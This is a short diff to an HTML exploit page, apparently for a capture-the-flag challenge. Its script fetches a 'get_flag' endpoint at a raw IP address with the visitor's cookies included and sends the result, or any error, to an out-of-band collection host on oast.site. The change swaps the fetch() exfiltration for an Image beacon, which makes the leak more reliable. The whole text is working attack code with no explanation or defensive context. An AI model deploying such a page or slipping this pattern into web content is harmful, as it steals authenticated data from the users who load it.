@@ -2,14 +2,14 @@
 <html>
 <body>
 <script>
-fetch('http://34.134.162.213:17001/get_flag',{credentials:'include'})
-.then(res=>res.text())
-.then(flag=>{
- fetch('https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/?flag='+encodeURIComponent(flag));
-})
-.catch(err=>{
- fetch('https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/?error='+encodeURIComponent(err));
-});
+fetch('http://34.134.162.213:17001/get_flag', {credentials:'include'})
+  .then(res => res.text())
+  .then(flag => {
+    new Image().src = 'https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/?flag=' + encodeURIComponent(flag);
+  })
+  .catch(err => {
+    new Image().src = 'https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/?error=' + encodeURIComponent(err);
+  });
 </script>
 </body>
 </html>
